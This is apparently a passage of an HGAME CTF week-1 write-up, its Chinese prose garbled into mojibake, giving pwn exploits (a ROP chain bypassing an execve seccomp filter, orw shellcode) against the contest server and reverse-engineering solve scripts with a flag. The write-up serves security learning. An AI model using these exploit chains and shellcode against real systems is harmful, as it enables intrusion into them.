src="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png" style="zoom:80%;" /><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œå¼€äº†æ²™ç®±ï¼Œç¦äº†<code>system</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆæ³„éœ²<code>libc</code>ã€‚</li><li>ç”±äºæº¢å‡ºçš„å¹¶ä¸å¤šï¼Œå› æ­¤å¾—æƒ³åŠæ³•<strong>å¢å¼ºæº¢å‡ºèƒ½åŠ›</strong>ã€‚ä¸€å¼€å§‹æƒ³ç€èµ°ä¸€æ­¥è¿”å›ä¸€æ­¥ï¼Œä½†æº¢å‡ºçš„æ•°é‡ä»ä¸è¶³ä»¥ä¸€æ¬¡æ€§å®Œæˆå¦‚<code>read(3,bss,0x30)</code>è¿™ä¸€ç³»åˆ—æ“ä½œã€‚è¯¥é¢˜æ¯”è¾ƒå·§å¦™çš„ä¸€ç‚¹æ˜¯ç”±äºæ˜¯<code>read</code>é€ æˆçš„æº¢å‡ºï¼Œæˆ‘ä»¬å…¶å®æ— éœ€æ§åˆ¶<code>rdi</code>å’Œ<code>rsi</code>ï¼Œåªéœ€å¢å¤§<code>rdx</code>ï¼Œå¹¶å†æ¬¡è°ƒç”¨<code>read</code>å³å¯ã€‚</li><li>ps. çœ‹äº†ä¸‹å®˜æ–¹<code>wp</code>ä½¿ç”¨çš„æ˜¯<code>æ ˆè¿ç§»</code>å’Œ<code>mprotect</code>ï¼Œæ„Ÿè§‰ä¸å¦‚æœ¬æ–¹æ³•ç®€å•ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31611</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul=<span class="number">0x4012C4</span></span><br><span class="line">flag_addr=<span class="number">0x404080</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r13_ret=<span class="number">0x0000000000401391</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404020</span>)+p64(elf.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload+=p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">openn=libc_base+<span class="number">0x10DCE0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">299</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdx_ret)+p64(<span class="number">0x300</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">264</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_r13_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x10E060</span>)+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜éœ€æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><ol><li><code>open</code>å’Œ<code>open64</code>æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œå½“æ—¶<code>libc</code>é‡Œæ‰¾åŠå¤©ï¼Œå‘ç°<code>open64</code>é‡Œæœ‰è¿™ä¹ˆä¸€å¥æ³¨é‡Šï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alternative name is &#x27;__open&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨<code>remote</code>è¿œç¨‹ç«¯å£æ—¶ï¼Œ<code>read</code>çš„<code>rdx</code>å‚æ•°æœ‰å¤šå¤§ä¼ å¤šå°‘ï¼Œå¦åˆ™ä¼šå¯¼è‡´ä¸‹é¢<code>send</code>çš„æ•°æ®è¢«ä¹‹å‰çš„<code>read</code>åƒæ‰ã€‚</li></ol><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>è¿™ç§<code>shellcode</code>é¢˜ç›®é™¤äº†æŒæ¡åŸºæœ¬çš„<code>orw_shellcode</code>å¤–ï¼Œè¦æ—¶åˆ»å…³æ³¨æ‰§è¡Œ<code>shellcode</code>å‰åçš„å¯„å­˜å™¨å˜åŒ–ï¼Œæ ¹æ®å¯„å­˜å™¨å†™<code>shellcode</code>ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" style="zoom:80%;" /><ul><li>é¦–å…ˆ<code>shellcode</code>æœ‰<code>16</code>ä¸ªå­—èŠ‚å¤§å°çš„é™åˆ¶ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ¥ä¸‹æ¥æˆ‘ä»¬è¦ç”¨<code>16</code>ä¸ªå­—èŠ‚å¤§å°é™åˆ¶çš„<code>shellcode</code>æ‰©å¤§æ¼æ´åˆ©ç”¨èƒ½åŠ›ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" style="zoom:80%;" /><ul><li>è°ƒè¯•å¹¶æ ¹æ®å¯„å­˜å™¨ç¼–å†™ä¸€ä¸‹<code>shellcode</code>ï¼Œç›®æ ‡æ˜¯å†™å…¥æ›´å¤šæ•°æ®åˆ°<code>0xcafe0000</code>è¿™ç‰‡ç©ºé—´å¹¶æ‰§è¡Œï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br></pre></td></tr></table></figure><ul><li>è€Œåå°±æ˜¯ç¼–å†™å¸¸è§„çš„<code>orw</code>çš„<code>shellcode</code>ï¼Œæ³¨æ„å¼€å¤´éœ€è¦å¤šå†™ä¸€äº›<code>nop</code>ï¼Œå¦åˆ™å†™å‡ºçš„å°±ä¸æ˜¯ç›®æ ‡<code>flag</code>ï¼ŒçŒœæµ‹æ˜¯æ§åˆ¶ç›¸å…³é—®é¢˜ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>æ€»çš„<code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>æ ¹æ®æ±‡ç¼–æ‰¾é€»è¾‘ï¼Œåˆ†æå®Œå‘ç°åªæ˜¯ç®€å•çš„å¼‚æˆ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1Bâ†‘p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3Bâ†“jiè‡ªå¢</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+Bâ†‘j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen; è¿”å›Strçš„é•¿åº¦è‡³eax</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax; iä¸len(Str)æ¯”è¾ƒ</span><br><span class="line">.text:00401185                 jge     short loc_40119D; å¤§åˆ™è·³å‡ºå¾ªç¯</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]; movsx å¸¦ç¬¦å·æ‰©å±•ä¼ é€</span><br><span class="line">.text:00401190                 xor     eax, 33h; å¼‚æˆ–åŠ å¯†</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25â†‘j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;welc0me_t0_re_wor1d!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><p>ç®€å•çš„åŠ å¯†æ‰‹æ³•ï¼Œæ‰¾åˆ°<code>you are right</code>ç®€å•åˆ†æå³å¯ï¼Œå¦‚æœä¸æ˜¯<code>exe</code>æ–‡ä»¶çš„è¯è¿˜æƒ³è¯•è¯•<code>angr</code>ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">10</span>]; <span class="comment">// [rsp+20h] [rbp-19h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+48h] [rbp+Fh]</span></span><br><span class="line">  __int128 v10[<span class="number">3</span>]; <span class="comment">// [rsp+50h] [rbp+17h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+80h] [rbp+47h]</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0x9FDFF04</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">0xB0F301</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">0xADF00500</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">0x5170607</span>;</span><br><span class="line">  v8[<span class="number">4</span>] = <span class="number">0x17FD17EB</span>;</span><br><span class="line">  v8[<span class="number">5</span>] = <span class="number">0x1EE01EA</span>;</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">0xFA05B1EA</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">0xAC170108</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">0xFDEA01EC</span>;</span><br><span class="line">  v8[<span class="number">9</span>] = <span class="number">0x60705F0</span>;</span><br><span class="line">  v9 = <span class="number">0xF9</span>;</span><br><span class="line">  sub_140001064(<span class="string">&quot;%50s&quot;</span>, v10);</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *(v10 + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">41</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (*(v10 + v3) ^ <span class="number">0x32</span>) - <span class="number">86</span>;</span><br><span class="line">    *(v10 + v3) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(v8 + v3) != v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;you are right!&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_140001010(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF3</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x17</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x17</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x01</span>,</span><br><span class="line">      <span class="number">0xEA</span>, <span class="number">0xB1</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0xEC</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>, <span class="number">0xFD</span>, <span class="number">0xF0</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x06</span>,</span><br><span class="line">      <span class="number">0xF9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i+<span class="number">86</span>)%<span class="number">256</span>)^<span 